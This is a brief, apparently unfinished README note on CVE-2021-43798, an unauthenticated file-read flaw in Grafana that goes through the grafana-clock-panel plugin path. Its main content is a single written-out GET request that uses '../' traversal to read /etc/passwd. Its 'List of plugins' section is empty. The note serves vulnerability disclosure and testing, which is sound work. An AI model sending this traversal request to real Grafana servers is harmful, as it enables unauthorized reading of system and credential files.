# Grafana

Grafana is the open source analytics & monitoring solution for every database.

## CVE-2021-43798 - Grafana-Unauth-File-Read

Unauthorized reading of files in Grafana (0day)

It looks like the new 0day LFI in Grafana exists thanks to the grafana-clock-panel plugin. It is enough to send a GET request of the form:

```GET /public/plugins/grafana-clock-panel/../../../../../../../etc/passwd```

# List of plugins

```

```
